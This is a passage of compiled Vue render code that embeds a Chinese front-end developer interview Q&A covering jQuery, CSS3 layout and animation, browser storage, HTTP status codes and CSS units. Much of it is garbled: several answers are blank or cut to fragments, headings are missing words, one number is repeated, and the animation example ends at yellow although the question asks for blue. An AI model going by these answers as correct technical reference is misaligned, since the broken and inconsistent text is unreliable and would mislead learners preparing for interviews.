和this区别")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("this，表示当前的上下文对象是一个html对象，可以调用html对象所拥有的属性和方法。")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("$(this),代表的上下文对象是一个jquery的上下文对象，可以调用jquery的方法和属性值。")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("h4",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("43、")]),t("br")]),n._v("CSS"),t("br"),n._v("JS"),t("br"),n._v("\n      CSS 表达式（Expression）"),t("br"),n._v("\n      JavaScript 和 CSS"),t("br"),n._v("\n      JavaScript 和 CSS"),t("br"),n._v("\n      <link> 代替 @import"),t("br"),t("br"),n._v("DOM访问\n    ")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("\n      优化图像css定位，图片全部保存在一张PNG8格式上）"),t("br"),n._v("favicon.ico要小而且可缓存\n    ")]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[n._v("44、ajax请求时，如何解析json数据")])]),t("p",[n._v("eval parse,鉴于安全性考虑 使用parse更靠谱")]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("JSON.parse(jsonstr); //可以将JSON字符串反序列化成JSON对象")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}}),t("strong")]),t("p"),t("h4",[t("strong",[n._v("45、"),t("span",{staticStyle:{color:"rgb(44,48,51)"}},[n._v("CSS实现三栏自适应布局（两边宽度固定，中间自适应）")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(153,51,0)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(153,51,0)"}},[n._v("<div")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("id")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v('"box"')]),t("strong",[t("span",{staticStyle:{color:"rgb(153,51,0)"}},[n._v(">")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(248,248,248)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(153,51,0)"}},[n._v("<div")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("id")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v('"left_box"')]),t("strong",[t("span",{staticStyle:{color:"rgb(153,51,0)"}},[n._v("></div>")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(153,51,0)"}},[n._v("<div")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("id")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v('"center_box"')]),t("strong",[t("span",{staticStyle:{color:"rgb(153,51,0)"}},[n._v("></div>")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(248,248,248)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(153,51,0)"}},[n._v("<div")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("id")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v('"right_box"')]),t("strong",[t("span",{staticStyle:{color:"rgb(153,51,0)"}},[n._v("></div>")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(153,51,0)"}},[n._v("</div>")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(92,92,92)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("#box")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("{")]),t("strong",[t("span",{staticStyle:{color:"rgb(0,102,153)"}},[n._v("width")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v(":")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("100%")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v(";")]),t("strong",[t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("display")])]),t("span",{staticStyle:{color:"rgb(255,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(0,102,153)"}},[n._v("height")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("100px")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(248,248,248)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("#left")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("_box,")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("#right")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("_box{")]),t("strong",[t("span",{staticStyle:{color:"rgb(0,102,153)"}},[n._v("width")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("200px")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v(";")]),t("strong",[t("span",{staticStyle:{color:"rgb(0,102,153)"}},[n._v("height")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("100px")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("#center")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("flex:")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("1")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v(";")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(0,102,153)"}},[n._v("height")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("100px")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("h4",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("46、")]),t("span",{staticStyle:{color:"rgb(44,48,51)"}},[n._v("CSS3中各个浏览器内核兼容的设置")])])]),t("p",{staticStyle:{background:"rgb(248,248,248)"}},[t("span",{staticStyle:{color:"rgb(255,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("-moz-")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(255,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("-ms-")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(248,248,248)"}},[t("span",{staticStyle:{color:"rgb(255,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("-webkit-")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(255,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("-o-")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[n._v("\n      IE9以下的浏览器不支持HTML5标签，所以需要导入一个html5.js补丁，原理是通过JS来生成HTML5新标签对象。\n    ")]),t("p",[n._v("\n      CSS都会用media query（响应式设计），IE8以下的浏览器不支持media\n      query，这会导致@media\n      声明的CSS不能生效，因此要导入一个css3-mediaqueries.js补丁。\n    ")]),t("p",[n._v("如下：")]),t("p",[t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("\x3c!--[if lte IE 8]> ")])]),t("p",[t("span",{staticStyle:{color:"rgb(255,0,0)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(255,0,0)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(255,0,0)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("<![endif]--\x3e")])]),t("p",[n._v("\n      /*\n      因为条件注释只对IE10以下版本有效（IE11已经取消支持），所以在其他现代浏览器里面会自动忽略，不会加载，因此不会有性能问题\n      */\n    ")]),t("p",[n._v("\n      /*\n      因为IE9以下浏览器不支持CSS3，IE9支持一部分，因此不能显示一些CSS3的过渡效果，对此有两种办法，一种是忽略，也就是降级或者是差异化设计。\n    ")]),t("p",[n._v("\n      jquery的动画替代，引入方法可以是条件注释，也可以通过检测Navigator来判断IE版本\n      */\n    ")]),t("h4",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[t("strong",[t("br"),n._v("47、"),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("什么是层叠顺序")])])]),t("p"),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(248,248,248)"}},[n._v("border")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("/")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(248,248,248)"}},[n._v("background")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[n._v("48、三角形的绘制")])]),t("p",[t("strong")]),t("p",{staticStyle:{background:"rgb(221,237,251)"}},[t("br"),n._v("#triangle-up {"),t("br"),t("br"),t("br"),t("br"),t("br"),t("br"),n._v("}\n    ")]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[n._v("49、CSS3有哪些新特性？")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("\n      CSS3实现圆角（border-radius:8px），阴影（box-shadow:10px），"),t("br"),n._v("text-shadow），线性渐变（gradient），变换（transform）\n    ")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("\n      Transform： rotate(9deg) //旋转\n    ")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("scale(0.85,0.90) //缩放")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("translate(0px,-30px) //定位")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("skew(-9deg,0deg) //倾斜")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}}),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("50、")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("什么是响应式设计？")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("它是关于网页制作的过程中让不同的设备有不同的尺寸和不同的功能。响应式设计是让所有的人能在这些设备上让网站运行正常")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("51、写一段css3动画，在5s内，div背景色从red变为blue")])])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("div")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("{")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("width:100px;")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("height:100px;")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("background:red;")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("animation:myfirst 5s;")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("}")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("@keyframes myfirst")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("{")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("from {background:red;}")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("to {background:yellow;}")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("}")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{attrs:{align:"justify"}},[t("strong",[n._v("52、Bootstrap的特性")])]),t("p",[n._v("响应式设计")]),t("p",[n._v("栅格布局")]),t("p",[n._v("完整的类库")]),t("p",[n._v("jQuery插件")]),t("p",[t("strong",[n._v("html5和css3,所以对浏览器有要求，IE必须9以上。")])]),t("p",[t("strong")]),t("p",{attrs:{align:"justify"}},[t("strong",[n._v("53、什么是boostrap")])]),t("p",[n._v("\n      Bootstrap是基于html、css、javascript的前端框架，为实现应用程序迅速开发的一套前端框架包\n    ")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("54")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("div+css的布局较table布局有什么优点？")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v(" css文件。")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("页面加载速度更快、结构化清晰、页面显示简洁。")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("表现与结构相分离。")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("seo）搜索引擎更友好，排名更容易靠前。")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("55、")]),t("strong",[t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("一个页面上有大量的图片（大型电商网站），加载很慢，你有哪些方法优化这些图片的加载，给用户更好的体验。")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("1、")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("图片懒加载，在页面上的未可视区域可以添加一个滚动条事件，判断图片位置与浏览器顶端的距离与页面的距离，如果前者小于后者，优先加载。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("2、")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("如果为幻灯片、相册等，可以使用图片预加载技术，将当前展示图片的前一张和后一张优先下载。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("3、")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("css图片，可以使用CSSsprite，SVGsprite，Iconfont、Base64等技术。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("4、")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("如果图片过大，可以使用特殊编码的图片，加载时会先加载一张压缩的特别厉害的缩略图，以提高用户体验。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(34,34,34)"}},[n._v("5、")]),t("span",{staticStyle:{color:"rgb(34,34,34)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("55")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("CSS3")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("新增伪类有那些？")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}},[n._v("\n        p 元素")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}},[n._v("\n        p 元素")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}},[n._v("\n        p 元素")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v(":checked，单选框或复选框被选中。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("56、")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("Cookie, LocalStorage 与 SessionStorage")])]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("三者的异同")])]),t("table",{attrs:{border:"1",cellspacing:"0"}},[t("tbody",[t("tr",[t("td",{staticStyle:{background:"rgb(241,241,241)"}},[t("p",{attrs:{align:"center"}},[t("strong",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("特性")])])])]),t("td",{staticStyle:{background:"rgb(241,241,241)"}},[t("p",{attrs:{align:"center"}},[t("strong",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("Cookie")])])])]),t("td",{staticStyle:{background:"rgb(241,241,241)"}},[t("p",{attrs:{align:"center"}},[t("strong",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("localStorage")])])])]),t("td",{staticStyle:{background:"rgb(241,241,241)"}},[t("p",{attrs:{align:"center"}},[t("strong",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("sessionStorage")])])])])]),t("tr",[t("td",{staticStyle:{background:"rgb(255,255,255)"}},[t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("数据的生命期")])])]),t("td",{staticStyle:{background:"rgb(255,255,255)"}},[t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("一般由服务器生成，可设置失效时间。如果在浏览器端生成Cookie，默认是关闭浏览器后失效")])])]),t("td",{staticStyle:{background:"rgb(255,255,255)"}},[t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("除非被清除，否则永久保存")])])]),t("td",{staticStyle:{background:"rgb(255,255,255)"}},[t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("仅在当前会话下有效，关闭页面或浏览器后被清除")])])])]),t("tr",[t("td",[t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("存放数据大小")])])]),t("td",[t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("4K左右")])])]),t("td",{attrs:{width:"342",colspan:"2"}},[t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("一般为5MB")])])])]),t("tr",[t("td",{staticStyle:{background:"rgb(255,255,255)"}},[t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("与服务器端通信")])])]),t("td",{staticStyle:{background:"rgb(255,255,255)"}},[t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("每次都会携带在HTTP头中，如果使用cookie保存过多数据会带来性能问题")])])]),t("td",{staticStyle:{background:"rgb(255,255,255)"},attrs:{width:"342",colspan:"2"}},[t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}},[n._v("仅在客户端（即浏览器）中保存，不参与和服务器的通信")])])])])])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("57、")]),t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("高度坍塌产生的原因？如何解决？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(75,75,75)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(75,75,75)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)",background:"rgb(255,255,255)"}},[n._v("overflow: hidden;")])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)",background:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("58、http状态码")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("200 - 请求成功")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("301 - 资源（网页等）被永久转移到其它URL")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("404 - 请求的资源（网页等）不存在")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("500 - 内部服务器错误")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[n._v("59、px和em，rem的区别")])]),t("p",[n._v("\n      px是一个绝对字体大小，"),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}},[n._v("em是根据其父元素的字体大小来设置")]),n._v("1em=16px。那么12px=0.75em,\n      10px=0.625em，但是用em计算相对复杂；CSS3提供了rem，它也是个相对单位，"),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}},[n._v("rem只相对跟节点<html>计算")]),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(248,248,248)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("16")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("62")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(248,248,248)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(248,248,248)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("10")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(0,0,255)"}},[n._v("1")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",[t("strong")]),t("p",[t("strong")]),t("p",[t("strong",[n._v("60、div垂直居中")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}},[n._v("<")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("style")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("type")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v('"text/css"')]),t("span",{staticStyle:{color:"rgb(212,212,212)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("rel")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v('"stylesheet"')]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(215,186,125)"}},[n._v(".table")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("display")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": 